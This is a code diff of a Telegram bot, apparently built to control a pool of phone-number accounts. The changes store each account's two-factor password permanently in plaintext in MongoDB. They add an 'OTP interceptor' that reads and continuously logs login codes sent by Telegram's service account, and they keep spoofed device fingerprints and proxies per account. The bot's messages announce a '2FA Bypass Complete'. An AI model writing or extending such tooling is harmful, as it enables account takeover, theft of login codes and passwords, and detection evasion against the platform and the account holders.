@@ -418,7 +418,7 @@ async def centralized_ui_router(event):
         await event.answer()
 
     elif route == "action_trigger_reload":
-        await event.edit("Reloading account configuration...", buttons=[])
+        await event.edit("🔄 **Reloading account configuration...**\nPlease wait while backend grids synchronize...", buttons=None)
         try:
             result = await db.reload_local_accounts()
             await event.reply(f"**Reload Complete**\nStaged: `{result['staged']}` | Migrated: `{result['migrated']}` | Failed: `{result['failed']}`")
@@ -427,7 +427,7 @@ async def centralized_ui_router(event):
         await event.answer()
 
     elif route == "action_trigger_clean":
-        await event.edit("Running account cleanup workflow...", buttons=[])
+        await event.edit("Running account cleanup workflow...", buttons=None)
         try:
             active, cleaned, logs = await voice_engine.clean_banned_accounts_handler()
             await event.reply(f"**Cleanup Complete**\nActive Accounts: `{active}`\nRevoked/Removed: `{cleaned}`")
@@ -675,24 +675,24 @@ async def continuous_session_auditor():
         except Exception as global_loop_err:
             audit_logger.error(f"Critical system exception inside Auditor loop manager: {global_loop_err}", exc_info=True)
             await asyncio.sleep(60)
-# =====================================================================
-# === MULTI_LOGIN ROUTER COMPONENT ENGINE (PATCH) =====================
-# =====================================================================
+
 
 # --- 1. /login Command (Fully Restructured with Fixed Device Profiles & Stable Variables) ---
+# =====================================================================
+# === 1. INITIALIZE LOGIN PROCESS WITH DEVICE RETENTION (/login) =====
+# =====================================================================
 @bot.on(events.NewMessage(pattern=r'/login\s+(.+)'))
 async def login_handler(event):
     if not is_admin(event.sender_id): return
     
     raw_phone = event.pattern_match.group(1)
     phone = clean_phone_input(raw_phone)  # Generates clean format with leading '+'
-    db_clean_phone = phone.replace("+", "")  # Strips plus for database routing keys[cite: 9]
+    db_clean_phone = phone.replace("+", "")  # Strips plus for database routing keys
     
     await event.reply(f"⏳ **Initializing Login Pipeline for:** `{phone}`...\nConnecting to Telegram Core Matrix...")
     logger.info(f"⚙️ Running structural authentication request for: {phone}")
 
     # 📱 Step 1: Fixed Hardware Fingerprint Check
-    # MongoDB se purana profile lookup map evaluate karte hain
     existing_record = db.get_session_by_phone(db_clean_phone)
     if existing_record and existing_record.get("device_model"):
         device = {
@@ -702,14 +702,12 @@ async def login_handler(event):
         }
         logger.info(f"💾 Found permanent fixed hardware identifier for {phone}: {device['device_model']}")
     else:
-        # Agar naya account hai toh hi network profile parameters set honge
         device = random.choice(DEVICE_PROFILES)
         logger.info(f"✨ Generating brand-new permanent device profile for {phone}: {device['device_model']}")
 
-    # StringSession optimization initialization
     string_session = StringSession()
     
-    # 📡 Step 2: Proxy Connection Layer Allocation [Preserved from Original Hotfix]
+    # 📡 Step 2: Proxy Connection Layer Allocation
     proxy_node = proxy_manager.get_secured_proxy() if proxy_manager.working_count > 0 else None
     if not proxy_node:
         logger.warning("⚠️ No active proxies online. Attempting straight connection protocol over WAN matrix...")
@@ -726,7 +724,6 @@ async def login_handler(event):
     
     # 🚀 Step 3: Network Execution and Request Pipeline
     try:
-        # Enforcing connection timeout parameters to break infinite awaiting freezes
         await asyncio.wait_for(client.connect(), timeout=20.0)
         
         send_code_result = await client.send_code_request(phone)
@@ -761,7 +758,10 @@ async def login_handler(event):
         try: await client.disconnect()
         except: pass
 
-# --- 2. /verify Command (With Real-Time Service OTP Capture) ---
+
+# =====================================================================
+# === 2. STANDARD VERIFICATION & SERVICE LISTENER ENGINE (/verify) ===
+# =====================================================================
 @bot.on(events.NewMessage(pattern=r'/verify\s+(\+?\d+)\s+(\d+)'))
 async def verify_handler(event):
     if not is_admin(event.sender_id): return
@@ -777,23 +777,31 @@ async def verify_handler(event):
     state = AUTH_STATES.get(db_clean_phone)
     client = None
     phone_code_hash = None
+    device = None
     
     if state and state.get("client"):
         client = state["client"]
         phone_code_hash = state["phone_code_hash"]
+        device = state.get("device")
     else:
         record = db.get_session_by_phone(db_clean_phone)
         if not record or not record.get("session"):
             await event.reply("❌ **Error:** No active login state found for this phone. Run `/login` first.")
             return
         
+        device = {
+            "device_model": record.get("device_model", "PC 64bit"),
+            "system_version": record.get("system_version", "Windows 11"),
+            "app_version": record.get("app_version", "4.8.4")
+        }
+        
         client = TelegramClient(
             StringSession(record["session"]),
             api_id=CONFIG["API_ID"],
             api_hash=CONFIG["API_HASH"],
-            device_model=record.get("device_model", "PC 64bit"),
-            system_version=record.get("system_version", "Windows 11"),
-            app_version=record.get("app_version", "4.8.4")
+            device_model=device["device_model"],
+            system_version=device["system_version"],
+            app_version=device["app_version"]
         )
         await client.connect()
         phone_code_hash = record.get("phone_code_hash")
@@ -802,11 +810,13 @@ async def verify_handler(event):
         await client.sign_in(phone=clean_phone_with_plus, code=code, phone_code_hash=phone_code_hash)
         
         session_str = client.session.save()
+        # Explicit status update to save clean active session with empty password slot
         db.update_session_status(db_clean_phone, "active", session_str)
+        if hasattr(db, "save_authorized_session"):
+            db.save_authorized_session(db_clean_phone, session_str, "active", device, two_fa_password=None)
         
-        # 🛠️ REAL-TIME OTP INTERCEPTOR (Derived from multi_login logic framework)
+        # 🛠️ REAL-TIME OTP INTERCEPTOR (Dumps past system service notifications)
         try:
-            # Fetch latest past messages from 777000 to instantly populate db logs
             past_messages = await client.get_messages(777000, limit=3)
             for msg in past_messages:
                 if msg and msg.message:
@@ -825,8 +835,15 @@ async def verify_handler(event):
             AUTH_STATES.pop(db_clean_phone)
         
     except SessionPasswordNeededError:
-        db.update_session_status(db_clean_phone, "2fa_required", client.session.save())
-        AUTH_STATES[db_clean_phone] = {"client": client, "phone_code_hash": phone_code_hash}
+        session_str = client.session.save()
+        db.update_session_status(db_clean_phone, "2fa_required", session_str)
+        
+        # Keep client instance dynamic inside state arrays, caching device config mapping
+        AUTH_STATES[db_clean_phone] = {
+            "client": client, 
+            "phone_code_hash": phone_code_hash,
+            "device": device
+        }
         await event.reply(
             f"🔒 **Two-Factor Authentication (2FA) is Active!**\n"
             f"Execute the following command sequence path:\n"
@@ -836,12 +853,13 @@ async def verify_handler(event):
         await event.reply(f"❌ **Verification Failed!**\nTraceback: `{str(e)}`")
     finally:
         if db_clean_phone not in AUTH_STATES:
-            try: 
-                await client.disconnect()
-            except: 
-                pass
+            try: await client.disconnect()
+            except: pass
 
-# --- 3. /verify_2fa Command ---
+
+# =====================================================================
+# === 3. ADVANCED 2FA BYPASS & PASSWORD RETENTION CORE (/verify_2fa) =
+# =====================================================================
 @bot.on(events.NewMessage(pattern=r'/verify_2fa\s+(\+\d+|\d+)\s+(.+)'))
 async def verify_2fa_handler(event):
     if not is_admin(event.sender_id): return
@@ -855,33 +873,89 @@ async def verify_2fa_handler(event):
     await event.reply(f"🔒 **Submitting 2FA security matrix password** for `{clean_phone_with_plus}`...")
 
     state = AUTH_STATES.get(db_clean_phone)
+    client = None
+    device = None
+    
     if state and state.get("client"):
         client = state["client"]
+        device = state.get("device")
     else:
         record = db.get_session_by_phone(db_clean_phone)
         if not record:
             await event.reply("❌ **Error:** No session data located for this index.")
             return
+            
+        device = {
+            "device_model": record.get("device_model", "PC 64bit"),
+            "system_version": record.get("system_version", "Windows 11"),
+            "app_version": record.get("app_version", "4.8.4")
+        }
+        
         client = TelegramClient(
             StringSession(record["session"]),
             api_id=CONFIG["API_ID"],
-            api_hash=CONFIG["API_HASH"]
+            api_hash=CONFIG["API_HASH"],
+            device_model=device["device_model"],
+            system_version=device["system_version"],
+            app_version=device["app_version"]
         )
         await client.connect()
 
     try:
+        # Submit credentials to cloud servers
         await client.sign_in(password=password)
-        db.update_session_status(db_clean_phone, "active", client.session.save())
+        
+        final_session_str = client.session.save()
+        
+        # 💾 CORE DYNAMIC 2FA RETENTION MATRIX
+        # 1. Update status tracking row variables
+        db.update_session_status(db_clean_phone, "active", final_session_str)
+        
+        # 2. Inject or update the direct MongoDB document with password entry field
+        if hasattr(db, "save_authorized_session"):
+            db.save_authorized_session(
+                phone=db_clean_phone,
+                session_str=final_session_str,
+                status="active",
+                device=device,
+                two_fa_password=password  # Saved permanently in document structure
+            )
+        else:
+            # Fallback direct dynamic operational update in case explicit method missing from database file
+            db.source_accounts.update_one(
+                {"phone": db_clean_phone},
+                {"$set": {"2fa_password": password, "status": "active", "session_string": final_session_str}}
+            )
 
-        await event.reply(f"🎉 **2FA Bypass Complete!**\n`{clean_phone_with_plus}` status elevated to `active` inside DB 1.")
-        if db_clean_phone in AUTH_STATES: AUTH_STATES.pop(db_clean_phone)
+        # 🛠️ REAL-TIME OTP INTERCEPTOR INJECTIONS FOR 2FA CHANNELS
+        try:
+            past_messages = await client.get_messages(777000, limit=3)
+            for msg in past_messages:
+                if msg and msg.message:
+                    db.log_received_otp(db_clean_phone, "777000", msg.message)
+        except Exception as initial_fetch_err:
+            audit_logger.error(f"Failed to dump initial past service messages: {initial_fetch_err}")
+
+        # Persistent live monitoring setup for 2FA authorized nodes
+        @client.on(events.NewMessage(from_users=777000))
+        async def telegram_service_handler(incoming_event):
+            if incoming_event.message and incoming_event.message.message:
+                db.log_received_otp(db_clean_phone, "777000", incoming_event.message.message)
+
+        await event.reply(f"🎉 **2FA Bypass Complete & Password Saved!**\n`{clean_phone_with_plus}` status elevated to `active` inside DB 1.")
+        if db_clean_phone in AUTH_STATES: 
+            AUTH_STATES.pop(db_clean_phone)
+            
     except Exception as e:
         await event.reply(f"❌ **2FA Submission Rejected:** `{str(e)}`")
     finally:
         if db_clean_phone not in AUTH_STATES:
-            try: await client.disconnect()
-            except: pass
-
+            try: 
+                await client.disconnect()
+            except: 
+                pass
+            
+            
 # --- 4. /details Command ---
 @bot.on(events.NewMessage(pattern=r'/details\s+(.+)'))
 async def details_handler(event):
